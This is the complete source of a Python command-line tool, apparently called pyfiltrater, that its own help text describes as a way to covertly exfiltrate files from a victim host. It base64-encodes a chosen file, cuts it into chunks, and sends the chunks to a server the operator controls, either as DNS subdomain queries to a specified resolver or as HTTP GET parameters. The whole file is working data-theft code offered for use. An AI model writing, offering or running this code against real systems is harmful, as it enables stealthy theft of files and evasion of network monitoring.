import argparse
import base64
import requests
from dns import resolver
from progress.bar import ShadyBar

def main():
    # Process Command-Line Arguments
    parser = argparse.ArgumentParser(description = "A Python script used to covertly exfil files over the network. This script will stage a file into bite-sized chunks of base64 encoded data, then exfiltrate the file over the network using the protocol of your choosing.", add_help=True)

    # Create subparsers to process positional arguments that are protocol dependent
    subparser = parser.add_subparsers(dest='mode', metavar='mode', help='Use <mode> -h to list addtional required and optional arguments for the selected mode')
    dns = subparser.add_parser('dns', description="A Python script used to covertly exfil files over the network. This script will stage a file into bite-sized chunks of base64 encoded data, then use a remote DNS server that's under your control to exfil the file over DNS. The victim host will exfil the payload by querying subdomains for the domain you specify, using the chunked data as a subdomain.", help='Use DNS queries to exfil a file over DNS')
    http = subparser.add_parser('http', description="A Python script used to covertly exfil over the network. This script will stage a file into bite-sized chunks of base64 encoded data, then send HTTP GET requests to a server that's under your control to exfil files over the web. The victim host will exfil the payload by sending requests to <domain>/index.html?id=<payload>.", help='Use HTTP GET requests to exfil files over HTTP')

    # Positional arguments for DNS
    dns.add_argument('-f', '--file', metavar='<string>', type=str, required=True, help='Specify the path to the target file')
    dns.add_argument('-d', '--domain', metavar='<string>', type=str, required=True, help="The base URL of the target domain: {example.com}")
    dns.add_argument('-r', '--resolver', metavar='<string>', type=str, required=True, help="The IP Address of the remote DNS server that will resolve the DNS queries")
    dns.add_argument('-l', '--length-of-payload', metavar='<int>', type=int, choices=[24,48,64,88], default=24, required=False, help='Specify a custom payload length when transmitting the file: {24,48,64,88} (Default: 24)')

    # Positional arguments for HTTP
    http.add_argument('-f', '--file', metavar='<string>', type=str, required=True, help='Specify the path to the target file')
    http.add_argument('-d', '--domain', metavar='<string>', type=str, required=True, help="The base URL of the target domain: {example.com}")
    http.add_argument('-l', '--length-of-payload', metavar='<int>', type=int, choices=[24,48,64,88], default=24, required=False, help='Specify a custom payload length when transmitting the file: {24,48,64,88} (Default: 24)')  
    http.add_argument('-s', '--ssl', action='store_true', help='Use HTTPS when transfering the file (Default: HTTP)')
    
    args = parser.parse_args()

    if args.mode == "dns" or args.mode == "http":
        staged_payload = stager(args.file, args.length_of_payload)
        if args.mode == "dns":
            dns_exfil(args.domain, args.resolver, staged_payload)
        else:
            http_exfil(args.domain, args.ssl, staged_payload)
    else:
        print("No protocol was specified! Use ./pyfiltrater.py -h to display usage options.")

# Prepare the file for exfiltration
def stager(file, length_of_payload): 
    file_handle = open(file, 'rb')
    file_contents = file_handle.read()
    encoded_file = base64.b64encode(file_contents).decode('ascii')

    file_handle.close()

    staged_payload = [encoded_file[i:i+length_of_payload] for i in range(0, len(encoded_file), length_of_payload)]
    return staged_payload

# Exfil the file over DNS
# Credit to https://stackoverflow.com/questions/34793061/socket-resolve-dns-with-specific-dns-server for the logic on onto send DNS requests to a user-specified DNS server.
def dns_exfil(domain, r, staged_payload):
    res = resolver.Resolver()
    res.nameservers = [r]
    count = len(staged_payload)
    with ShadyBar('Exfiltrating Payload...' , max=count, suffix="%(percent).1f%% Payload Sent over the Network") as bar:
        for subdomain in staged_payload:
            try:
                res.resolve(subdomain + "." + domain)
            except:
                # The DNS Request will throw an exception because the subdomain doesn't exist but the request will still go through.
                pass
            bar.next()
        bar.finish()

# Exfil the file over HTTP
def http_exfil(domain, ssl, staged_payload):
    if ssl:
        domain = 'https://' + domain
    else:
        domain = 'http://' + domain
    count = len(staged_payload)
    with ShadyBar('Exfiltrating Payload...' , max=count, suffix="%(percent).1f%% Payload Sent over the Network") as bar:
        for payload in staged_payload:
            try:
                requests.get(domain + '/index.html?id=' + payload, allow_redirects=False)
            except Exception as e:
                print(e)
            bar.next()
        bar.finish()

if __name__ == "__main__":
    main()
